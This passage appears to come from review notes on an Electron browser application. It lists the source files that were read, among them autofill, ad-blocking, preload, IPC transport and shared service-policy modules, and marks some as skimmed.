- `src/main/autofill/contentScript.ts` (skimmed)
- `src/main/adblock/adBlockManager.ts`
- `src/main/shellCore/createElectronShellCore.ts`

**Preload:**

- `src/preload/index.ts`
- `src/preload/panelPreload.ts`
- `src/preload/browserPreload.ts`
- `src/preload/autofillPreload.ts`
- `src/preload/autofillOverlayPreload.ts`
- `src/preload/ipcTransport.ts`
- `src/preload/wsTransport.ts` (skimmed)

**Renderer:**

- `src/renderer/index.tsx`

**Shared:**

- `packages/shared/src/serviceDispatcher.ts`
- `packages/shared/src/servicePolicy.ts`
- `packages/shared/src/shell/urlParsing.ts`
- `packages/shared/src/contextIdToPartition.ts`
- `packages/rpc/src/types.ts` (for `SERVER_SERVICE_NAMES`)
